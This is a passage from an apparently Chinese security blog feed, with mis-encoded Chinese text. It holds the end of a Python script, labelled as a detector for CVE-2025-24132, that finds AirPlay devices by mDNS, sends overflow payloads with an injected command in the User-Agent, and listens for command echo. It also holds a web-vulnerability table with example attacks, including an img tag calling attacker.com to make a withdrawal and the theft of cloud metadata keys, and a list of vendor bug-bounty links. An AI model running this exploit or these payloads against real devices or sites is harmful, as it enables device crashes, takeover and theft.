class="number">0x400</span>&#125;</span>\r\n&quot;</span></span><br><span class="line">        <span class="string">f&quot;User-Agent: AirPlay/310.17 &quot;</span> + cmd + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line">    ).encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">            s.settimeout(TIMEOUT)</span><br><span class="line">            s.connect((ip, port))</span><br><span class="line">            s.send(pkt)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">heur_vuln</span>(<span class="params">model, features</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ—§modelæˆ–ä½ç‰¹å¾ä½ =&gt; å¯èƒ½æ—§SDK&quot;&quot;&quot;</span></span><br><span class="line">    vuln_models = [<span class="string">&#x27;AppleTV2,1&#x27;</span>, <span class="string">&#x27;AirPort10,115&#x27;</span>, <span class="string">&#x27;CarPlay1,1&#x27;</span>, <span class="string">&#x27;Audio2,1&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(m <span class="keyword">in</span> model <span class="keyword">for</span> m <span class="keyword">in</span> vuln_models): <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(features, <span class="number">16</span>) &amp; <span class="number">0xFF</span> == <span class="number">0</span>: <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>: <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_all_ipv4_interfaces</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä½¿ç”¨æœ¬æœºæ‰€æœ‰çš„IPv4ç½‘ç»œæ¥å£&quot;&quot;&quot;</span></span><br><span class="line">    addrs = []</span><br><span class="line">    <span class="keyword">for</span> adapter <span class="keyword">in</span> ifaddr.get_adapters():</span><br><span class="line">        <span class="keyword">for</span> ip <span class="keyword">in</span> adapter.ips:</span><br><span class="line">            <span class="keyword">if</span> ip.is_IPv4 <span class="keyword">and</span> <span class="keyword">not</span> ip.ip.startswith(<span class="string">&#x27;127.&#x27;</span>):</span><br><span class="line">                addrs.append(ip.ip)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">set</span>(addrs))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query_airplay_info</span>(<span class="params">ip: <span class="built_in">str</span>, port: <span class="built_in">int</span> = <span class="number">7000</span>, timeout: <span class="built_in">float</span> = <span class="number">2.0</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å…ˆPTRæ‰«å®ä¾‹åï¼Œå†æ‹¿TXTï¼Œè§£å†³ç¡¬ç¼–ç åå­—å¯¹ä¸ä¸Šçš„é—®é¢˜&quot;&quot;&quot;</span></span><br><span class="line">    zc = Zeroconf()</span><br><span class="line">    found = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># è¢«åŠ¨ç›‘å¬2ç§’ï¼ŒæŠŠåŒä¸€IPçš„ä»»ä½• *_airplay._tcpè®°å½•éƒ½æ‹¿åˆ°</span></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">Snatcher</span>:</span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">add_service</span>(<span class="params">self, zc, type_, name</span>):</span><br><span class="line">                info = zc.get_service_info(type_, name)</span><br><span class="line">                <span class="keyword">if</span> info <span class="keyword">and</span> socket.inet_ntoa(info.addresses[<span class="number">0</span>]) == ip <span class="keyword">and</span> info.port == port:</span><br><span class="line">                    <span class="keyword">nonlocal</span> found</span><br><span class="line">                    found = info</span><br><span class="line">            remove_service = update_service = <span class="keyword">lambda</span> *_: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        browser = ServiceBrowser(zc, <span class="string">&quot;_airplay._tcp.local.&quot;</span>, Snatcher())</span><br><span class="line">        time.sleep(timeout)</span><br><span class="line">        browser.cancel()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: found.name.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>],</span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: found.properties.get(<span class="string">b&#x27;model&#x27;</span>, <span class="string">b&#x27;Unknown&#x27;</span>).decode(),</span><br><span class="line">                <span class="string">&#x27;features&#x27;</span>: <span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(found.properties.get(<span class="string">b&#x27;features&#x27;</span>, <span class="string">b&#x27;0&#x27;</span>), <span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        zc.close()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:                 <span class="comment"># æŒ‡å®šå•ä¸ªç›®æ ‡</span></span><br><span class="line">        ip, port = sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">7000</span></span><br><span class="line">        info = query_airplay_info(ip, port)</span><br><span class="line">        <span class="keyword">if</span> info:</span><br><span class="line">            airplay_devices.append(&#123;**info, <span class="string">&#x27;ip&#x27;</span>: ip, <span class="string">&#x27;port&#x27;</span>: port&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            airplay_devices.append(&#123;</span><br><span class="line">                <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Manual-Target&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;ip&#x27;</span>: ip, <span class="string">&#x27;port&#x27;</span>: port,</span><br><span class="line">                <span class="string">&#x27;model&#x27;</span>: <span class="string">&#x27;Unknown&#x27;</span>, <span class="string">&#x27;features&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">            &#125;)</span><br><span class="line">    <span class="keyword">else</span>:                                 <span class="comment"># ç›‘å¬æ‰€æœ‰ç½‘ç»œæ¥å£</span></span><br><span class="line">        interfaces = get_all_ipv4_interfaces()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] å°†åœ¨ä»¥ä¸‹æ¥å£ç›‘å¬mDNSï¼š&quot;</span>, interfaces)</span><br><span class="line">        zc = Zeroconf(interfaces=interfaces)</span><br><span class="line">        ServiceBrowser(zc, <span class="string">&quot;_airplay._tcp.local.&quot;</span>, AirPlayListener())</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line">        zc.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> airplay_devices:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] æœªå‘ç°ä»»ä½•AirPlayè®¾å¤‡&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> dev <span class="keyword">in</span> airplay_devices:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] è®¾å¤‡<span class="subst">&#123;dev[<span class="string">&#x27;name&#x27;</span>]&#125;</span>  <span class="subst">&#123;dev[<span class="string">&#x27;ip&#x27;</span>]&#125;</span>:<span class="subst">&#123;dev[<span class="string">&#x27;port&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    model=<span class="subst">&#123;dev[<span class="string">&#x27;model&#x27;</span>]&#125;</span>  features=0x<span class="subst">&#123;dev[<span class="string">&#x27;features&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_port(dev[<span class="string">&#x27;ip&#x27;</span>], dev[<span class="string">&#x27;port&#x27;</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [-] ç«¯å£ä¸é€šï¼Œè·³è¿‡&quot;</span>); <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> heur_vuln(dev[<span class="string">&#x27;model&#x27;</span>], dev[<span class="string">&#x27;features&#x27;</span>]):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [!] å¯èƒ½ä½¿ç”¨æ—§SDKï¼Œå°è¯•è¿›è¡Œæº¢å‡ºå¹¶æ‰§è¡Œå‘½ä»¤&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [!] ç‰ˆæœ¬ç‰¹å¾è¾ƒæ–°ï¼Œå°è¯•è¿›è¡Œæº¢å‡ºå¹¶æ‰§è¡Œå‘½ä»¤&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æœ¬åœ°ä¸´æ—¶ç›‘å¬å›æ˜¾</span></span><br><span class="line">        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        listener.settimeout(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            listener.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, LISTEN_PORT))</span><br><span class="line">            listener.listen(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            listener = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> sz <span class="keyword">in</span> OVERFLOW_SIZES:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    [*] å·²å‘é€ <span class="subst">&#123;sz&#125;</span>B æº¢å‡ºè½½è·&quot;</span>)</span><br><span class="line">            crash_target(dev[<span class="string">&#x27;ip&#x27;</span>], dev[<span class="string">&#x27;port&#x27;</span>], sz)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            still_up = check_port(dev[<span class="string">&#x27;ip&#x27;</span>], dev[<span class="string">&#x27;port&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> still_up:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    [!!!]<span class="subst">&#123;sz&#125;</span>BæˆåŠŸè§¦å‘å´©æºƒ â†’ æ¼æ´å­˜åœ¨ï¼&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    [-] æ¼æ´å¯èƒ½å·²ä¿®å¤&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> listener:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                conn, _ = listener.accept()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&quot;CVE-2025-24132&quot;</span> <span class="keyword">in</span> conn.recv(<span class="number">128</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;    [!!!] åŒæ—¶æ”¶åˆ°å‘½ä»¤å›æ˜¾ â†’ å¯åˆ©ç”¨&quot;</span>)</span><br><span class="line">                conn.close()</span><br><span class="line">            <span class="keyword">except</span> socket.timeout: <span class="keyword">pass</span></span><br><span class="line">            listener.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    banner = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">           __                                      __             ______   ________   ______  </span></span><br><span class="line"><span class="string">          /  |                                    /  |           /      \\ /        | /      \\ </span></span><br><span class="line"><span class="string">  _______ $$ |____    ______    ______   __    __ $$/  _______  /$$$$$$  |$$$$$$$$/ /$$$$$$  |</span></span><br><span class="line"><span class="string"> /       |$$      \\  /      \\  /      \\ /  \\  /  |/  |/       \\ $$ \\__$$/ $$ |__    $$ |  $$/ </span></span><br><span class="line"><span class="string">/$$$$$$$/ $$$$$$$  | $$$$$$  |/$$$$$$  |$$  \\/$$/ $$ |$$$$$$$  |$$      \\ $$    |   $$ |      </span></span><br><span class="line"><span class="string">$$      \\ $$ |  $$ | /    $$ |$$ |  $$ | $$  $$&lt;  $$ |$$ |  $$ | $$$$$$  |$$$$$/    $$ |   __ </span></span><br><span class="line"><span class="string"> $$$$$$  |$$ |  $$ |/$$$$$$$ |$$ \\__$$ | /$$$$  \\ $$ |$$ |  $$ |/  \\__$$ |$$ |_____ $$ \\__/  |</span></span><br><span class="line"><span class="string">/     $$/ $$ |  $$ |$$    $$ |$$    $$/ /$$/ $$  |$$ |$$ |  $$ |$$    $$/ $$       |$$    $$/ </span></span><br><span class="line"><span class="string">$$$$$$$/  $$/   $$/  $$$$$$$/  $$$$$$/  $$/   $$/ $$/ $$/   $$/  $$$$$$/  $$$$$$$$/  $$$$$$/  </span></span><br><span class="line"><span class="string">                                                                     Detect CVE-2025-24132</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>å¨èƒæƒ…æŠ¥</category>
      </categories>
      <tags>
        <tag>æº¢å‡ºæ¼æ´ã€RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>WEBå®‰å…¨</title>
    <url>/WEB%E5%AE%89%E5%85%A8.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<table>
<thead>
<tr>
<th align="left">æ¼æ´</th>
<th align="left">åŸç†</th>
<th align="left">å¯¹åº”åŠŸèƒ½ç‚¹</th>
<th align="left">å±å®³ or åˆ©ç”¨</th>
</tr>
</thead>
<tbody><tr>
<td align="left">SQL æ³¨å…¥</td>
<td align="left">ç”¨æˆ·è¾“å…¥æ‹¼è¿› SQLï¼Œæ•°æ®åº“æŠŠæ¶æ„å½“æŒ‡ä»¤æ‰§è¡Œ</td>
<td align="left">æœç´¢æ¡†ã€ç­›é€‰æ ï¼ˆLIKEã€IN è¯­å¥ï¼‰<br>ç™»å½•ã€å¯†ç æ‰¾å›ï¼ˆSELECT WHERE ç”¨æˆ·å&#x2F;é‚®ç®±ï¼‰<br>åˆ†é¡µã€æ’åºï¼ˆORDER BY å­—æ®µåå¯ç”¨æˆ·æ§åˆ¶ï¼‰<br>æŠ¥è¡¨å¯¼å‡ºã€å¤šé€‰åˆ é™¤ï¼ˆid åˆ—è¡¨æ‹¼æ¥ï¼‰<br>ç®¡ç†åå°â€œå¿«é€Ÿ SQLâ€æ§åˆ¶å°ï¼ˆæœ€å±é™©ï¼‰</td>
<td align="left">æ‹–åº“ï¼šä¸‹è½½æ•°æ®åº“ä¸­çš„å…¨éƒ¨æ•°æ®ï¼›<br>ç¯¡æ”¹ï¼šä¿®æ”¹ç®¡ç†å‘˜å¯†ç ã€å†™å…¥æœ¨é©¬</td>
</tr>
<tr>
<td align="left">XSS</td>
<td align="left">è¾“å…¥è¢«å›æ˜¾æˆ HTMLï¼Œæµè§ˆå™¨æŠŠè„šæœ¬å½“é¡µé¢è·‘</td>
<td align="left">æ˜µç§°ã€ç•™è¨€ã€è¯„è®ºã€ç§ä¿¡ã€å•†å“è¯„ä»·<br>æœç´¢å…³é”®è¯å›æ˜¾ï¼ˆâ€œæ‚¨æœç´¢çš„æ˜¯ï¼šxxxâ€ï¼‰<br>é”™è¯¯æç¤ºã€404 é¡µé¢ï¼ˆæŠŠç”¨æˆ·è·¯å¾„ç›´æ¥è¾“å‡ºï¼‰<br>å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ï¼ˆè¿‡æ»¤ä¸ä¸¥ï¼Œå¯æ’&lt;svg&#x2F;onload&gt;ï¼‰<br>é…ç½®ç³»ç»Ÿï¼ˆç½‘ç«™æ ‡é¢˜ã€é¡µè„šç»Ÿè®¡ä»£ç ï¼‰</td>
<td align="left">å·Cookieï¼šæ‹¿åˆ°ç®¡ç†å‘˜ç™»å½•æ€ï¼Œä¸ç”¨å¯†ç ç›´æ¥è¿›åå°<br>ç½‘é¡µæŒ‚é©¬ï¼šè®¿å®¢æ‰“å¼€é¡µé¢è‡ªåŠ¨ä¸‹è½½å‹’ç´¢ç—…æ¯’ï¼Œæˆ–è€…è·³è½¬åˆ°å…¶ä»–é¡µé¢</td>
</tr>
<tr>
<td align="left">CSRF</td>
<td align="left">æµè§ˆå™¨è‡ªåŠ¨å¸¦ Cookieï¼Œé»‘å®¢å€Ÿå—å®³è€…èº«ä»½å‘è¯·æ±‚</td>
<td align="left">ä¿®æ”¹å¯†ç &#x2F;ç»‘å®šé‚®ç®±ï¼ˆç¼ºå°‘æ—§å¯†ç äºŒæ¬¡æ ¡éªŒï¼‰<br>åå°â€œä¸€é”®å‡çº§â€â€œé‡å¯æœåŠ¡â€æŒ‰é’®<br>è½¬è´¦ã€æ”¶è´§åœ°å€ä¿®æ”¹ã€éšç§è®¾ç½®<br>å¯Œæ–‡æœ¬é‡ŒåµŒå…¥ &lt;img src&#x3D;â€œ&#x2F;&#x2F;attacker.com&#x2F;withdraw?amount&#x3D;100â€&gt;<br>RESTful API ä»…ä¾èµ– Cookie é‰´æƒï¼Œæ—  Token&#x2F;Origin æ ¡éªŒ</td>
<td align="left">ç”¨æˆ·&#x2F;ç®¡ç†å‘˜åœ¨ç™»å½•æ€ä¸‹è¢«â€œå·å·â€è½¬è´¦ã€æ”¹é…ç½®</td>
</tr>
<tr>
<td align="left">SSRF</td>
<td align="left">æœåŠ¡å™¨æ›¿æ”»å‡»è€…å»è®¿é—® URLï¼Œæš´éœ²å†…ç½‘</td>
<td align="left">å›¾ç‰‡&#x2F;æ–‡ç« â€œä¸€é”®é‡‡é›†â€â€œè¿œç¨‹å›¾ç‰‡åŠ è½½â€<br>WebHookã€é€šçŸ¥å›è°ƒé…ç½®ï¼ˆè®©æœåŠ¡ç«¯å» POSTï¼‰<br>åœ¨çº¿ç¿»è¯‘ã€PDF ç”Ÿæˆã€OCRï¼ˆè¾“å…¥ URL æŠ“å†…å®¹ï¼‰<br>å¤´åƒâ€œä» URL ä¸Šä¼ â€<br>äº‘å‚å•† API ä»£ç†ï¼ˆmetadataã€å†…ç½‘ 169.254.169.254ï¼‰</td>
<td align="left">åˆ©ç”¨è·³æ¿æœºè®¿é—®å†…ç½‘å…¶ä»–æœåŠ¡ï¼›<br>è¯·æ±‚169.254.169.254å…ƒæ•°æ®æ¥å£ï¼Œè·å–é˜¿é‡Œäº‘å¯†é’¥</td>
</tr>
<tr>
<td align="left">æ–‡ä»¶ä¸Šä¼ </td>
<td align="left">åªçœ‹åç¼€&#x2F;MIMEï¼Œæœªæ ¡éªŒå†…å®¹ï¼Œå¯ä¼ è„šæœ¬</td>
<td align="left">å¤´åƒã€ç›¸å†Œã€å·¥å•é™„ä»¶<br>å¯Œæ–‡æœ¬ç¼–è¾‘å™¨â€œæœ¬åœ°ä¸Šä¼ â€<br>å¯¼å…¥ Excel&#x2F;CSV åšæ•°æ®è¿ç§»<br>æ’ä»¶ã€ä¸»é¢˜ ZIP å®‰è£…ï¼ˆWordPress å…¸å‹ï¼‰<br>æŠ¥è¡¨æ¨¡æ¿ã€è¯ä¹¦æ¨¡æ¿ä¸Šä¼ </td>
<td align="left">ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ã€æ‹¿åˆ° WebShelï¼›<br>æŒ‚æš—é“¾&#x2F;æŒ–çŸ¿ï¼šæŠŠæ­£å¸¸ç½‘é¡µæ›¿æ¢æˆè èœå¹¿å‘Šæˆ–æ¤å…¥ JS æŒ–çŸ¿</td>
</tr>
<tr>
<td align="left">å‘½ä»¤æ‰§è¡Œ</td>
<td align="left">è¾“å…¥è¢«æ‹¼è¿›ç³»ç»Ÿå‘½ä»¤æˆ– evalï¼ŒæœåŠ¡å™¨ç›´æ¥è¿è¡Œ</td>
<td align="left">åœ¨çº¿ Pingã€Nslookupã€traceroute å·¥å…·<br>è§†é¢‘&#x2F;éŸ³é¢‘â€œè½¬ç â€åå°ï¼ˆffmpeg å‚æ•°æ‹¼æ¥ï¼‰<br>è®¡åˆ’ä»»åŠ¡ã€è¿œç¨‹å‘½ä»¤ä¸‹å‘ï¼ˆAnsible&#x2F;saltï¼‰<br>é‚®ä»¶å‘é€æµ‹è¯•ï¼ˆmail()&#x2F;sendmail æ‹¼æ¥ï¼‰<br>æ¨¡æ¿å¼•æ“ï¼ˆFreemarkerã€Velocityï¼‰æ¸²æŸ“ç”¨æˆ·è¾“å…¥</td>
<td align="left">æœåŠ¡å™¨å°±æ˜¯æ”»å‡»è€…çš„è‚‰é¸¡ï¼Œæƒ³åˆ åº“å°±åˆ åº“ï¼›<br>æ¨ªå‘æ‰“åˆ°åŸŸæ§</td>
</tr>
<tr>
<td align="left">ååºåˆ—åŒ–</td>
<td align="left">ä¸å¯ä¿¡å­—èŠ‚æµè¿˜åŸå¯¹è±¡æ—¶è§¦å‘é­”æœ¯æ–¹æ³•é“¾</td>
<td align="left">Redis&#x2F;Jackson&#x2F;Fastjson è§£æå‰ç«¯ JSON åˆ°å¯¹è±¡<br>Dubboã€RMIã€SOAP å†…éƒ¨æœåŠ¡é€šä¿¡<br>è®°ä½æˆ‘ Cookie &#x3D; base64(åºåˆ—åŒ–ç”¨æˆ·å¯¹è±¡)<br>æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆKafkaã€ActiveMQï¼‰æ¶ˆè´¹ç«¯<br>ç¼“å­˜â€œå¯¹è±¡â€å­˜å‚¨ï¼ˆMemcached å­˜ Java å¯¹è±¡ï¼‰</td>
<td align="left">åªéœ€ä¸€ä¸ª HTTP è¯·æ±‚ï¼Œåœ¨è¿›ç¨‹é‡Œé¢ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œè¿æ–‡ä»¶éƒ½ä¸ç•™<br>æ‰“é›†ç¾¤ï¼šJava æœåŠ¡ç¾¤å…±ç”¨æ¶ˆæ¯é˜Ÿåˆ—ï¼Œä¸€æ¡æ¶æ„æ¶ˆæ¯è®©æ‰€æœ‰èŠ‚ç‚¹åŒæ—¶ä¸­æ‹›</td>
</tr>
<tr>
<td align="left">è¶Šæƒè®¿é—®</td>
<td align="left">åªæŒ‰å¯é¢„æµ‹ ID è¿”å›æ•°æ®ï¼Œæœªæ ¡éªŒå½’å±</td>
<td align="left">è®¢å•ã€å‘ç¥¨ã€å¿«é€’å•å· ..&#x2F;detail?id&#x3D;10001<br>åå° &#x2F;admin&#x2F;user&#x2F;delete?id&#x3D;123ï¼ˆæ™®é€šç”¨æˆ·ä¹Ÿèƒ½è®¿é—®ï¼‰<br>ä¿®æ”¹èµ„æ–™æ—¶éšè—å­—æ®µâ€œrole&#x3D;adminâ€<br>å›¢é˜Ÿåä½œæ–‡æ¡£ &#x2F;doc&#x2F;read?doc_id&#x3D;xxx<br>API &#x2F;api&#x2F;v1&#x2F;users&#x2F;{uid}&#x2F;wallet æœªæ ¡éªŒ uid ä¸ token ä¸€è‡´æ€§</td>
<td align="left">çœ‹åˆ«äººéšç§æ•°æ®ï¼šæŠŠ URL é‡Œçš„ id&#x3D;10001 æ”¹æˆ 10002ï¼Œç›´æ¥çœ‹åˆ°ä»–äººå®¶åº­ä½å€ã€ä½“æ£€æŠ¥å‘Šï¼›<br>åˆ·å…‰å¹³å°èµ„é‡‘æˆ–ç§¯åˆ†</td>
</tr>
<tr>
<td align="left">XXE</td>
<td align="left">XML è§£æå™¨å…è®¸å¤–éƒ¨å®ä½“ï¼Œè¯»æ–‡ä»¶å‘è¯·æ±‚</td>
<td align="left">è€ç‰ˆæœ¬ Office&#x2F;ODF æ–‡ä»¶ä¸Šä¼ åæœåŠ¡ç«¯è§£æ<br>SOAPã€SAMLã€RSS è®¢é˜…è§£æ<br>PDF&#x2F;Wordâ€œæ¨¡æ¿åˆå¹¶â€åŠŸèƒ½ï¼ˆå¸¦ XML æ•°æ®å²›ï¼‰<br>æ”¯ä»˜&#x2F;ç‰©æµæ¥å£æ¥æ”¶ XML æŠ¥æ–‡<br>æŠ¥è¡¨è®¾è®¡å™¨å¯¼å…¥ .jrxml .xdp ç­‰ XML æ¨¡æ¿</td>
<td align="left">ä»»æ„æ–‡ä»¶è¢«è¯»å‡º(&#x2F;etc&#x2F;passwdã€web.configã€ç§é’¥)ï¼›<br>å†…ç½‘æ¢é’ˆï¼šfile:&#x2F;&#x2F;192.168.1.10&#x2F;c$&#x2F;test.txt æ¢æµ‹å†…ç½‘å­˜æ´»ä¸»æœº</td>
</tr>
<tr>
<td align="left">é€»è¾‘æ¼æ´</td>
<td align="left">ä¸šåŠ¡æµç¨‹&#x2F;çŠ¶æ€æœºç¼ºæ ¡éªŒï¼Œå¯è·³è¿‡æˆ–é‡å¤</td>
<td align="left">ä¼˜æƒ åˆ¸&#x2F;çº¢åŒ…ï¼šå…ˆé¢†åç”¨ï¼Œå¯è´Ÿä½™é¢ã€é‡å¤æ ¸é”€<br>é‡ç½®å¯†ç ï¼šçŸ­ä¿¡éªŒè¯ç åœ¨å®¢æˆ·ç«¯æ ¡éªŒï¼ŒæœåŠ¡ç«¯æœªäºŒæ¬¡éªŒè¯<br>è®¢å•æ”¯ä»˜ï¼šå¹¶å‘è¯·æ±‚ç”Ÿæˆå¤šç¬” 0 å…ƒå• <br>ç§¯åˆ†å…‘æ¢ï¼šæœªæ ¡éªŒâ€œå…‘æ¢æ•°é‡â‰¤åº“å­˜â€<br>æ³¨å†Œï¼šå‰ç«¯ JS é™åˆ¶ç”¨æˆ·åé•¿åº¦ï¼Œåç«¯æœªé™åˆ¶ï¼Œå¯¼è‡´ admin   ç©ºæ ¼ç»•è¿‡å”¯ä¸€æ€§</td>
<td align="left">0 å…ƒè´­ã€é‡å¤é€€æ¬¾ã€çŸ­ä¿¡ç‚¸å¼¹</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>OWASP TOP10</tag>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>SRCæŒ–æ˜</title>
    <url>/SRC%E6%8C%96%E6%8E%98.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<table>
<thead>
<tr>
<th align="center">Name</th>
<th align="center">Link</th>
</tr>
</thead>
<tbody><tr>
<td align="center">å­—èŠ‚è·³åŠ¨å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.bytedance.com/submit">https://security.bytedance.com/submit</a></td>
</tr>
<tr>
<td align="center">è…¾è®¯å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.tencent.com/index.php/report/add">https://security.tencent.com/index.php/report/add</a></td>
</tr>
<tr>
<td align="center">é˜¿é‡Œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.alibaba.com/">https://security.alibaba.com/</a></td>
</tr>
<tr>
<td align="center">äº¬ä¸œå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://security.jd.com/">http://security.jd.com/</a></td>
</tr>
<tr>
<td align="center">ç™¾åº¦å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://sec.baidu.com/views/main/loophole.html#home">http://sec.baidu.com/views/main/loophole.html#home</a></td>
</tr>
<tr>
<td align="center">é¡ºä¸°å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="http://sfsrc.sf-express.com/submitBug">http://sfsrc.sf-express.com/submitBug</a></td>
</tr>
<tr>
<td align="center">360åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.360.cn/Report/index">https://security.360.cn/Report/index</a></td>
</tr>
<tr>
<td align="center">å“”å“©å“”å“©å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.bilibili.com/">https://security.bilibili.com/</a></td>
</tr>
<tr>
<td align="center">çˆ±å¥‡è‰ºå®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.iqiyi.com/#submit">https://security.iqiyi.com/#submit</a></td>
</tr>
<tr>
<td align="center">èš‚èšé›†å›¢å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.alipay.com/sc/afsrc/home.htm">https://security.alipay.com/sc/afsrc/home.htm</a></td>
</tr>
<tr>
<td align="center">BIGO SRC</td>
<td align="center"><a href="https://security.bigo.sg/#/submittingReport">https://security.bigo.sg/#/submittingReport</a></td>
</tr>
<tr>
<td align="center">è´å£³å®‰å…¨åº”æ€¥å“åº”ä¸­å¿ƒ</td>
<td align="center"><a href="https://security.ke.com/vuls">https://security.ke.com/vuls</a></td>
</tr>
